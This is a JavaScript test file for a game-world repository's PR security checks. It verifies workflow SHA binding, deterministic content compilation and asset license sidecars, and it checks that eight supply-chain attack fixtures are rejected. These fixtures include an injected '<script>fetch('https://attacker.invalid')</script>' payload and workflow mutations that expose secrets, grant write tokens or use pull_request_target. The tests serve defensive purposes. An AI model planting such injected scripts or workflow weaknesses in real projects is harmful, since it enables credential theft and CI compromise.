import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { compileWorld, inspectWorld } from "../../scripts/compile-world.mjs";
import { validateCodeowners, validateVersionManifestWriter, validateWorkflow, verifyRepository } from "../../scripts/verify-pr-security.mjs";

const root = path.resolve(".");
const workflow = await readFile(path.join(root, ".github/workflows/pr.yml"), "utf8");
const codeowners = await readFile(path.join(root, ".github/CODEOWNERS"), "utf8");
const versionManifestWriter = await readFile(path.join(root, "apps/web/scripts/write-manifest.mjs"), "utf8");
const fixtures = JSON.parse(await readFile(new URL("./attack-fixtures.json", import.meta.url), "utf8"));

test("正式 PR workflow、CODEOWNERS 与 Ruleset 安全契约通过", async () => {
  assert.deepEqual(await verifyRepository(root), []);
});

test("PR checkout、version manifest 与 release manifest 都绑定贡献者 head SHA，不接受合成 merge SHA", () => {
  assert.deepEqual(validateWorkflow(workflow), []);
  const syntheticMergeMutation = workflow
    .replace("--commit \"$SOURCE_COMMIT\"", "--commit \"$GITHUB_SHA\"");
  assert.ok(validateWorkflow(syntheticMergeMutation).some((problem) => problem.includes("贡献者 head SHA")));
  assert.deepEqual(validateVersionManifestWriter(versionManifestWriter), []);
  const writerMutation = versionManifestWriter.replace(
    "process.env.SOURCE_COMMIT || process.env.GITHUB_SHA",
    "process.env.GITHUB_SHA || process.env.SOURCE_COMMIT",
  );
  assert.ok(validateVersionManifestWriter(writerMutation).some((problem) => problem.includes("合成 merge SHA")));
});

test("世界内容编译完全确定且产出可发布 manifest", async () => {
  const temporary = await mkdtemp(path.join(os.tmpdir(), "echo-town-world-"));
  try {
    const first = path.join(temporary, "first.json");
    const second = path.join(temporary, "second.json");
    const left = await compileWorld({ root: path.join(root, "world"), output: first });
    const right = await compileWorld({ root: path.join(root, "world"), output: second });
    assert.equal(left.manifest.contentHash, right.manifest.contentHash);
    const corePack = left.manifest.packs.find((pack) => pack.packType === "content-pack");
    assert.equal(corePack.content.entries[0].id, "old-clocktower");
    assert.equal(left.manifest.packs.filter((pack) => pack.packType === "mystery-seed").length, 3);
    assert.deepEqual(left.manifest.assetLicenses, []);
    assert.equal(await readFile(first, "utf8"), await readFile(second, "utf8"));
  } finally {
    await rm(temporary, { recursive: true, force: true });
  }
});

test("二进制资产必须携带同路径、可追溯的许可旁车", async () => {
  const temporary = await mkdtemp(path.join(os.tmpdir(), "echo-town-license-"));
  try {
    await mkdir(path.join(temporary, "packs"), { recursive: true });
    await mkdir(path.join(temporary, "assets"), { recursive: true });
    await writeFile(path.join(temporary, "packs/base.json"), await readFile(path.join(root, "world/packs/echo-town-core.json")));
    await writeFile(path.join(temporary, "assets/token.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47]));
    await assert.rejects(() => inspectWorld(temporary), /缺少同路径资产许可旁车/u);
    await writeFile(path.join(temporary, "assets/token.png.license.json"), JSON.stringify({
      schemaVersion: 1,
      assetPath: "assets/token.png",
      license: "CC0-1.0",
      attribution: { author: "测试作者", source: "https://example.invalid/token", modified: false },
    }));
    const inspected = await inspectWorld(temporary);
    assert.equal(inspected.assetLicenses.length, 1);
    assert.equal(inspected.assetLicenses[0].license.assetPath, "assets/token.png");
  } finally {
    await rm(temporary, { recursive: true, force: true });
  }
});

test("8 个供应链攻击 fixture 全部判红", async () => {
  const outcomes = [];
  for (const fixture of fixtures) {
    let rejected = false;
    if (fixture.target === "workflow") {
      const mutated = mutateWorkflow(fixture.id, workflow);
      rejected = validateWorkflow(mutated).length > 0;
    } else if (fixture.target === "codeowners") {
      rejected = validateCodeowners(codeowners.replace("/world/ @spalagu", "")).length > 0;
    } else {
      rejected = await rejectsWorldFixture(fixture.id);
    }
    outcomes.push({ id: fixture.id, rejected });
  }
  assert.equal(outcomes.length, 8);
  assert.ok(outcomes.every((outcome) => outcome.rejected), JSON.stringify(outcomes));
});

function mutateWorkflow(id, source) {
  if (id === "secret-read") return source.replace("env:\n  CI", "env:\n  TOKEN: ${{ secrets.PAT }}\n  CI");
  if (id === "write-token") return source.replace("contents: read", "contents: write");
  if (id === "privileged-checkout") return source.replace("pull_request:", "pull_request_target:");
  if (id === "unpinned-action") return source.replace(/actions\/checkout@[0-9a-f]{40}/u, "actions/checkout@v7");
  if (id === "ignored-failure") return source.replace("timeout-minutes: 30", "timeout-minutes: 30\n    continue-on-error: true");
  throw new Error(`未知 workflow fixture：${id}`);
}

async function rejectsWorldFixture(id) {
  const temporary = await mkdtemp(path.join(os.tmpdir(), "echo-town-attack-"));
  try {
    await mkdir(path.join(temporary, "packs"), { recursive: true });
    if (id === "oversized-asset") {
      await writeFile(path.join(temporary, "oversized.png"), Buffer.alloc(5 * 1024 * 1024 + 1));
      await writeFile(path.join(temporary, "packs/base.json"), await readFile(path.join(root, "world/packs/echo-town-core.json")));
    } else if (id === "malicious-script") {
      const pack = JSON.parse(await readFile(path.join(root, "world/packs/echo-town-core.json"), "utf8"));
      pack.entries[0].summary = "<script>fetch('https://attacker.invalid')</script>";
      await writeFile(path.join(temporary, "packs/base.json"), JSON.stringify(pack));
    }
    try { await inspectWorld(temporary); } catch { return true; }
    return false;
  } finally {
    await rm(temporary, { recursive: true, force: true });
  }
}
